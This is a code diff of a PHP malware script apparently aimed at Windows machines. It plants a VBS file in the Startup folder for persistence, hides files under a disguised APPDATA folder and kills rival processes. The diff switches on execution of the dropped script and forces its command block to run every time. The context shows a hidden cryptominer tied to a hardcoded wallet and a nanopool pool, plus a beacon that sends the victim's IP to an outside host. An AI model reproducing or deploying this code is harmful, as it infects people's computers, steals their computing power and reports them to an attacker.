@@ -79,6 +79,11 @@ $GLOBALS['__getdev_002'] = function($lolpath)
 	return $device;
 };
 
+$GLOBALS['__execvbmin_002'] = function($vbpath)
+{
+	
+};
+
 $lolm_path = getenv('APPDATA') . '\\microsoft_win_x86';
 @mkdir($lolm_path);
 $id_com = $lolm_path . '\\com_key.dat';
@@ -90,8 +95,9 @@ if(!$work_key)
 	@file_put_contents($id_path, $work_key);
 }
 $work_key = trim($work_key);
-$command_id = '000045';
-if(@file_get_contents($id_com) !== $command_id)
+$command_id = 'php000047';
+/*if(@file_get_contents($id_com) !== $command_id)*/
+if(1)
 {
 	@file_put_contents($id_com, $command_id);
 	try{
@@ -129,6 +135,7 @@ if(@file_get_contents($id_com) !== $command_id)
 		$vbs = preg_replace('/\{TIMEOUT\}/is', (string)(mt_rand(1000*60*1, 1000*60*5)), $vbs);
 		$vbs_path = getenv('APPDATA') . '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup';
 		$execlol = false;
+		$vbs_exec_path = null;
 		if(is_dir($vbs_path))
 		{
 			/**
@@ -136,7 +143,6 @@ if(@file_get_contents($id_com) !== $command_id)
 			@exec('taskkill /f /im w_driverx86.exe');
 			@exec('taskkill /f /im w_driver1.95_x86.exe');
 			/**/
-			sleep(2);
 			$count_files = 0;
 			$di = new DirectoryIterator($vbs_path);
 			unset($data);
@@ -151,6 +157,7 @@ if(@file_get_contents($id_com) !== $command_id)
 				{
 					$execlol = true;
 					@file_put_contents($data->getPathname(), $vbs);
+					$vbs_exec_path = $data->getPathname();
 					/*@exec('start "" "'.$data->getPathname().'"');*/
 				}
 				else
@@ -160,23 +167,24 @@ if(@file_get_contents($id_com) !== $command_id)
 			{
 				$execlol = true;
 				@file_put_contents($vbs_path.'\\'.$vbsname, $vbs);
+				$vbs_exec_path = $vbs_path.'\\'.$vbsname;
 				/*@exec('start "" "'.$vbs_path.'\\'.$vbsname.'"');*/
 			}
 		}
-		if($execlol && 0) /*disabled*/
+		if($execlol && $vbs_exec_path)
 		{
-			sleep(10);
 			$output = array();
 			$r = 0;
 			@exec('tasklist', $output, $r);
 			$output = implode("\n", $output);
 			if(false === stripos($output, 'w_driver1.95_x86'))
 			{
+				@exec('start "" "'.$vbs_exec_path.'"');
+				/**
 				$output = array();
 				$r = 0;
 				@exec('"' . $lolm_path . '" --list-devices --nocolor', $output, $r);
 				$devices = implode("\n", $output);
-				
 				$log_path = dirname($lolm_path) . '\\temp_log.txt';
 				@pclose(@popen('start /B cmd /c ""' . $lolm_path . '" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user 9hJsrcoUYwKc92BXKbiVotX7CbFLkT85GY6r6FtnK7bu1qfHokD.'.$work_key.'_dev'.$devnum.' --watchdog exit --nocolor --devices '.$devnum.' > "' . $log_path . '" 2>&1"', 'r'));
 				sleep(10);
@@ -199,6 +207,7 @@ if(@file_get_contents($id_com) !== $command_id)
 						@$GLOBALS['__download_002']('https://secondsapphost.servehttp.com/test_procs/test.php?ip='.$ipl, $post);
 					}
 				}
+				/**/
 			}
 		}
 	}
